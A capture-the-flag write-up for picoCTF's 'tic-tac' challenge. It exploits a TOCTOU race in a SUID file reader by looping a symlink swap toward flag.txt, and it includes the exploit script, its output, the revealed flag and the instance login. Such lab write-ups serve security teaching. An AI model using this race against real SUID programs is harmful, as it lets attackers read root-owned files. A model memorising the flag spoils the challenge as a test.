## Description
>Someone created a program to read text files; we think the program reads files with root privileges but apparently it only accepts to read files that are owned by the user running it. `ssh` to `saturn.picoctf.net:62983`, and run the binary named "txtreader" once connected. Login as `ctf-player` with the password, `d137d16e`

---
Upon ssh into machine, we see `txtreader` binary and flag.txt file, however we don't have permissions to read them. Fortunately, they also give us the pre-compiled code for `txtreader` so that we might get a better idea on what's going on:
```cpp
#include <iostream>  
#include <fstream>  
#include <unistd.h>  
#include <sys/stat.h>  
  
int main(int argc, char *argv[]) {  
 if (argc != 2) {  
   std::cerr << "Usage: " << argv[0] << " <filename>" << std::endl;  
   return 1;  
 }  
  
 std::string filename = argv[1];  
 std::ifstream file(filename);  
 struct stat statbuf;  
  
 // Check the file's status information.  
 if (stat(filename.c_str(), &statbuf) == -1) {  
   std::cerr << "Error: Could not retrieve file information" << std::endl;  
   return 1;  
 }  
  
 // Check the file's owner.  
 if (statbuf.st_uid != getuid()) {  
   std::cerr << "Error: you don't own this file" << std::endl;  
   return 1;  
 }  
  
 // Read the contents of the file.  
 if (file.is_open()) {  
   std::string line;  
   while (getline(file, line)) {  
     std::cout << line << std::endl;  
   }  
 } else {  
   std::cerr << "Error: Could not open file" << std::endl;  
   return 1;  
 }  
  
 return 0;  
}
```
Essentially, the file first checks if the file exists, then checks if our permission to view the file. If we are allowed to view, it will read the file contents. It's also worth noting that `txtreader` has SUID bit set, allowing it to run as root when we use:
```
$ ls -l txtreader    
-rwsr-xr-x 1 root root 19016 Mar 16 02:28 txtreader
```
If we can send the textreader to open a file we have permissions on, then quickly swap it with a file linked to the flag, we should be able to trick the program into reading the flag contents for us. This is known as a Race Condition, or **TOCTOU** type of problem. 
[This video by John Hammond](https://youtu.be/HbCCrF9GOtQ) covers a similar CTF challenge, and the solution can be done with the same approach.
	1. We will create our own file called `link` with touch, that we can read/write to.
	2. We will start `txtreader`, and tell it to read `link`, which is owned by us.
	3. `txtreader` will check the file, and confirm we have permission to read the file
	4. We will delete `link`, and create a new `link` file that is symlinked to flag.txt. Now when things want to interact with `link`, they are pointed to flag.txt
	5. `txtreader` will attempt to read `link`, except it now points to `flag.txt`. Since it already confirmed we have permissions, it will output the contents of `flag.txt`
Since `txtreader` won't be waiting for us to manipulate the files in between actions, we have to be very fast, hence the race aspect.  Our human action speeds aren't nearly good enough, so what we can do is loop the action of swapping `link` , while also looping the run of `txtreader`. After enough runs, hopefully our action timings will line up and we can get the flag.
### Racing with an infinite loop:
Making the link loop, `linker.sh`:
```
while true
do
	rm link
	touch link
	rm link
	ln -s /home/ctf-player/flag.txt link
done
```

Setting up the linker loop and running `txtreader`:
```
ctf-player@pico-chall$ chmod +x linker.sh 
ctf-player@pico-chall$ ./linker.sh 
rm: cannot remove 'link': No such file or directory
^Z
[1]+  Stopped                 ./linker.sh
ctf-player@pico-chall$ bg 1
[1]+ ./linker.sh &
ctf-player@pico-chall$ while [ 1 ]; do ./txtreader link; done 2>/dev/null
picoCTF{ToctoU_!s_3a5y_f482a247}
```
Overall while this method works, it is not very reliable. Sometimes you can get lucky and the flag is read after a few minutes of running, other times it had not succeeded once in the full 15min duration of the instance.

picoCTF{ToctoU_!s_3a5y_f482a247}

### Reliable race fixing?
It might be possible to "fix" the race for us, resulting in very reliable success of flag read. [This post](https://www.usenix.org/legacy/events/fast08/tech/full_papers/tsafrir/tsafrir_html/index.html)  describes using a filesystem maze too large for the system to handle in memory at once, allowing for a more clear window of opportunity for us to switch targets. 
The maze consists of many nested folders, containing symlinks pointing to another batch of nested folders. After repeating for x times, the final link points to the file we own. The maze is too large to be placed in the filesystem cache, and this process results in slower navigation and an increased delay between the action of checking permissions and the action of reading the file contents.

While I did not have time to utilize this trick on tic-tac, it might be worth exploring on another CTF challenge.
